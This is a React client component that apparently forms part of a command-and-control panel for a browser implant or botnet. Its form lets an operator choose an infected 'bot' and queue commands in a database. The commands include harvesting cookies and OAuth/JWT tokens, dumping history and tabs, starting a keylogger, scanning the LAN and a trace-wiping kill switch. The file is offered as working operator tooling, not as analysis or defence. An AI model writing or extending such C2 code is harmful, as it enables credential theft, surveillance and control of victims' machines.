"use client";

import { useState } from "react";
import { createClient } from "@/lib/supabase/client";
import { useRouter } from "next/navigation";

const COMMAND_TYPES = [
    { value: "TRIGGER_SCREENSHOT", label: "📸 Take Screenshot", desc: "Capture the current visible tab" },
    { value: "HARVEST_COOKIES", label: "🍪 Harvest Cookies", desc: "Extract all cookies from high-value domains" },
    { value: "HARVEST_TOKENS", label: "🔑 Harvest Tokens", desc: "Extract OAuth/JWT tokens from storage" },
    { value: "SCAN_NETWORK", label: "🌐 Scan Network", desc: "Perform LAN discovery scan" },
    { value: "DUMP_HISTORY", label: "🕘 Dump History", desc: "Extract browsing history" },
    { value: "DUMP_TABS", label: "🧩 Dump Tabs", desc: "List all open tabs" },
    { value: "ACTIVATE_KEYLOGGER", label: "⌨️ Start Keylogger", desc: "Enable keystroke capture" },
    { value: "DEACTIVATE_KEYLOGGER", label: "⌨️ Stop Keylogger", desc: "Disable keystroke capture" },
    { value: "KILL", label: "💀 Kill Switch", desc: "Terminate the implant and wipe traces" },
    { value: "CUSTOM", label: "🔧 Custom", desc: "Send a custom JSON payload" },
];

export default function CommandForm({
    bots,
}: {
    bots: { bot_id: string; hostname: string | null }[];
}) {
    const [selectedBot, setSelectedBot] = useState("");
    const [commandType, setCommandType] = useState("");
    const [customPayload, setCustomPayload] = useState("{}");
    const [sending, setSending] = useState(false);
    const [sent, setSent] = useState(false);
    const router = useRouter();
    const supabase = createClient();

    const handleSend = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!selectedBot || !commandType) return;

        setSending(true);
        let payload = {};
        try {
            payload = JSON.parse(customPayload);
        } catch {
            payload = { raw: customPayload };
        }

        const { error } = await supabase.from("commands").insert({
            bot_id: selectedBot,
            command_type: commandType,
            payload,
            status: "pending",
        });

        if (!error) {
            setSent(true);
            setTimeout(() => {
                setSent(false);
                setCommandType("");
                setCustomPayload("{}");
            }, 2000);
            router.refresh();
        }
        setSending(false);
    };

    return (
        <div className="bg-zinc-900/60 backdrop-blur border border-zinc-800/50 rounded-2xl p-6">
            <h2 className="text-sm font-semibold text-white mb-4">Issue Command</h2>
            <form onSubmit={handleSend} className="space-y-4">
                {/* Bot Selector */}
                <div>
                    <label className="block text-xs text-zinc-500 mb-1.5 uppercase tracking-wider">Target Bot</label>
                    <select
                        value={selectedBot}
                        onChange={(e) => setSelectedBot(e.target.value)}
                        className="w-full px-3 py-2.5 bg-zinc-800/50 border border-zinc-700 rounded-xl text-sm text-white focus:outline-none focus:ring-2 focus:ring-emerald-500/50"
                        required
                    >
                        <option value="">Select a bot...</option>
                        {bots.map((bot) => (
                            <option key={bot.bot_id} value={bot.bot_id}>
                                {bot.hostname || bot.bot_id.slice(0, 16)}
                            </option>
                        ))}
                    </select>
                </div>

                {/* Command Type */}
                <div>
                    <label className="block text-xs text-zinc-500 mb-1.5 uppercase tracking-wider">Command</label>
                    <div className="space-y-1.5 max-h-64 overflow-y-auto pr-1">
                        {COMMAND_TYPES.map((cmd) => (
                            <button
                                key={cmd.value}
                                type="button"
                                onClick={() => setCommandType(cmd.value)}
                                className={`w-full text-left px-3 py-2.5 rounded-xl border text-sm transition-all ${commandType === cmd.value
                                        ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-400"
                                        : "bg-zinc-800/20 border-zinc-800/50 text-zinc-400 hover:border-zinc-700/50 hover:text-white"
                                    }`}
                            >
                                <span className="font-medium">{cmd.label}</span>
                                <p className="text-[11px] text-zinc-500 mt-0.5">{cmd.desc}</p>
                            </button>
                        ))}
                    </div>
                </div>

                {/* Custom Payload */}
                {commandType === "CUSTOM" && (
                    <div>
                        <label className="block text-xs text-zinc-500 mb-1.5 uppercase tracking-wider">Payload (JSON)</label>
                        <textarea
                            value={customPayload}
                            onChange={(e) => setCustomPayload(e.target.value)}
                            rows={4}
                            className="w-full px-3 py-2.5 bg-zinc-800/50 border border-zinc-700 rounded-xl text-sm text-white font-mono focus:outline-none focus:ring-2 focus:ring-emerald-500/50"
                        />
                    </div>
                )}

                {/* Submit */}
                <button
                    type="submit"
                    disabled={sending || !selectedBot || !commandType}
                    className={`w-full py-2.5 rounded-xl text-sm font-medium transition-all ${sent
                            ? "bg-emerald-500/15 text-emerald-400 border border-emerald-500/30"
                            : "bg-gradient-to-r from-emerald-500 to-cyan-500 text-white hover:from-emerald-600 hover:to-cyan-600 shadow-lg shadow-emerald-500/15"
                        } disabled:opacity-50 disabled:cursor-not-allowed`}
                >
                    {sending ? "Sending..." : sent ? "✓ Command Queued" : "Send Command"}
                </button>
            </form>
        </div>
    );
}
